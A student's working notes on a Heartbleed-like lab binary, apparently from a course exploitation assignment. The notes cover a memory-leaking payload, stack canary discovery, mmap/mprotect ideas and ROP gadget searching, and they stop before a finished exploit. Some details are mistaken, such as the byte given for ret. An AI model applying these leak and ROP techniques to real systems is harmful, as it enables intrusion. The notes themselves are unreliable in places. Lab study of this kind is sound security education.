--------------------

Years ago there was this neat little bug discovered in OpenSSL, which became known as "Heartbleed". The world's first bug with a name. Heck, it even had a logo! :) That fad has really caught on since... ShellShock, Log4Shell, DirtyCOW, Spectre, Meltdown, and the list goes on. If you've found a bug and need a name, here's a handy resource: https://paulbellamy.com/vulnerability-name-generator/

I have attempted to recreate something similar to Heartbleed here for you. It's definitely buggy, but I made sure to enable both stack cookies and DEP/NX, meaning it should be super-duper impossible to exploit... right?

In keeping with tradition, since this is a more difficult challenge I will only require that you give it your best effort. I would like to see everyone at least attempt it, but I won't require a full working solution for full credit. That said, if you land a shell I'll be very impressed!

--------------------

2022.09.27.2315.EST

[HELPFUL] https://stackabuse.com/how-to-exploit-the-heartbleed-bug/

checksec ./lab4-3.bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

This tells me that PIE is disabled, probably on purpose. Can we use this to force a rwx section and then manually navigate to it?
Also important to note is that this is as statically linked binary with no imports

If I run gdb's [x/64x 0x7fffffffe008] I get a list of additional addresses that seem to gradually increase in value padded by 0x7fff
I have no idea what I'm looking at

When main is broken into rsp/rbp is located at 0xde80 and contains rbp (libc's init) of 0x0000000000402ee0
and subsequently the return addr (libc's start main) of 0x402710
These addresses are stored in memory at location 0x7fffffffde80
Once the 420 bytes are pushed (the two integers of length 8 bytes each and the 1024 bytes for the data[1024])
we arrive at rsp of 0x7fffffffda60 which is correct
But when I run [x/420x $rsp] I am provided with 680 bytes rather than 0x420...
I have no idea why I'm getting more bytes than I'm asking for

What we WANT to see are these values:
0x007fffffffdf00│+0x0000: 0x00000000402ee0  →  <__libc_csu_init+0> endbr64       ← $rsp, $rbp
0x007fffffffdf08│+0x0008: 0x00000000402710  →  <__libc_start_main+1168> mov edi, eax
Since these are what the top of the stack looks like right before pushing rsp back to accomidate the 0x420 bytes

When I run the payload:
payload = b""
payload += b"2048:"
payload += b"A"*1024
payload += b"\n"
I get the following:
x00\x00\x00\x00\x00    \x87C\x13,\xe0.@\x00\x00\x00'@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\xff\xff\xff\x7f\x00>\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00j\x9f·>\xdb\xeb\x80/@\x00\x00\x00\x00\x00\x00\x00\xf0M\x00\x00\x00\x00\x00\x00j\x7f!\xc8\xc1$\x14j\xdd\xd2\xb7>\xdb\xeb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8e\x1c\x00\x00\x00\xe0\xff\xff\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe3\xff\xff\xff\x7f\x00\x00\x00\x00\x00u\xe3\xff\xff\xff\x7f\x00\x84\xe3\xff\xff\xff\x7f\x00\x98\xe3\xff\xff\xff\x7f\x00\xbb\xe3\xff\xff\xff\x7f\x00\xf1\xe3\xff\xff\xff\x7f\x00\x12\xff\xff\xff\x7f\x00\x1f\xff\xff\xff\x7f\x00=\xe4\xff\xff\xff\x7f\x00Y\xe4\xff\xff\xff\x7f\x00m\xe4\xff\xff\xff\x7f\x00\x89\xe4\xff\xff\xff\x7f\x00\x99\xe4\xff\xff\xff\x7f\x00\xaa\xe4\xff\xff\xff\x7f\x00\xb4\xe4\xff\xff\xff\x7f\x00\xc1\xe4\xff\xff\xff\x7f\x00\xe0\xe4\xff\xff\xff\x7f\x00>\xe5\xff\xff\xff\x7f\x00\\xe5\xff\xff\xff\x7f\x00\x94\xe5\xff\xff\xff\x7f\x00\xa7\xe5\xff\xff\xff\x7f\x00\xc5\xe5\xff\xff\xff\x7f\x00\xe0\xe5\xff\xff\xff\x7f\x00,\xe6\xff\xff\xff\x7f\x00?\xe6\xff\xff\xff\x7f\x00Q\xe6\xff\xff\xff\x7f\x00\x7f\xe6\xff\xff\xff\x7f\x00\x93\xe6\xff\xff\xff\x7f\x00\x9d\xe6\xff\xff\xff\x7f\x00\xa8\xe6\xff\xff\xff\x7f\x00\xca\xe6\xff\xff\xff\x7f\x00\xe3\xe6\xff\xff\xff\x7f\x00\xfc\xe6\xff\xff\xff\x00D\xe7\xff\xff\xff\x7f\x00t\xe7\xff\xff\xff\x7f\x00\x8a\xe7\xff\xff\xff\x7f\x00\xa9\xe7\xff\xff\xff\x7f\x00\xb8\xe7\xff\xff\xff\x7f\x00\xec\xe7\xff\xff\xff\x7f\x00\x03\xff\xff\xff\x7f\x00(\xe8\xff\xff\xff\x7f\x009\xe8\xff\xff\xff\x7f\x00s\xe8\xff\xff\xff\x7f\x00\x88\xe8\xff\xff\xff\x7f\x00\x93\xe8\xff\xff\xff\x7f\x00\xd6\xe8\xff\xff\xff\x7f\x00\xde\xe8\xff\xff\xff\x7f\x00\x19\xff\xff\xff\x7f\x0\xef\xff\xff\xff\x7f\x00 \xef\xff\xff\xff\x7f\x008\xef\xff\xff\xff\x7f\x00M\xef\xff\xff\xff\x7f\x00f\xef\xff\xff\xff\x7f\x00{\xef\xff\xff\xff\x7f\x00\x93\xef\xff\xff\xff\x7f\x00\xa8\xef\xff\xff\xff\x7f\x00\x00\x00\x00\x00!\x00\x00\x00\x00\xd0\xff\xf7\xff\x00\x00\x00\x00\x00\xfb\x8b\x00\x06\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00Waiting for heart beat request...

Okay so I did a dumb dumb. Turns out I was screwing the entire alignment up because I didn't account for the additional newline character
However I'm still getting weird issues accessing the return pointer. I'm missing the last nibble for some reason and I don't know why

So to be clear our return pointer SHOULD be at:
([First two integers] 16 + 16) do not count as the data buffer is created after these are pushed to the stack
([data] 1024) + ([Stack Padding?] 16 + 16) + ([rbp] 16) = 1072 (0x430)

Okay I'm able to overwrite the desired return address, however stack canary is being triggered
I actually don't know how to properly bypass this tbh. I knew before but have since forgotten

Could it be that those two bytes after data[1024] on the stack is actually the cookie?
Yes... yes it is... I can't believe it took me that long to figure that simple part out

I think I could use [void *memalign(size_t alignment, size_t size);] to malloc onto the heap
And then use [int mprotect(void *addr, size_t len, int prot);] to set permissions
e.g. [buffer = memalign(pagesize, pagesize);] and then [mprotect(buffer, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC);]
This will add rwx to that memory location and since ASLR is disabled (PIC) I should be able to access this location with a hardcoded ptr

Or instead I could use [void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);] instead
That way I can map memory virtually and set permissions at the same time
Sending NULL to addr will force the kernel to choose a location for me. ASLR (PIC) being disabled will be a good help here too

gdb's [disass mmap64] returns the location 0x452290

--== COOL TIP FOR FINDING ROP GADGETS!!! ==--
If you can't seem to find a gadget you can search memory for what bytes are 'supposed' to match the gadget instead
e.g. say you can't find a [pop rax;ret] gadget, you could just search for the binary equivilant
0x58 is pop rax and 0xc3 is ret. So in gdb you could run [search /b start,end,0x58,0xcb] Use [vmmap] to show where your binary is loaded
The /b is to search with granularity at the byte level
And if you want to concatenate your bytes into a word just use /h for halfwords (2bytes), /w for words (4bytes), and /g for giant words (8bytes)
Just make sure you account for endianness. e.g. pop rax;ret might become [find /h 0x400000, 0x4e5000, 0xc358]
I'd rather just use the single byte granularity though

JEEZE! I can't even seem to find a malloc or alloc gadget...
With the help of Ghidra and actually just running [disass malloc] in gdb I found it at 0x427910

Could I just allocate memory via malloc and have that go to the heap, then call mprotect and change it to rwx?

gef: search-pattern 0x59c4 doesn't return anything, but search-pattern 0xc459 does... wtf


Could xor eax, eax
push eax, push desired_rcx, xor eax, pop eax, xchg ecx, pop eax
his should work right?



0x0044fa45               87c1  xchg ecx, eax
0x0044fa47         e80583e007  call 0x8257d51


or


0x0000000000443fef: xchg ecx, eax; sub eax, edx; ret;
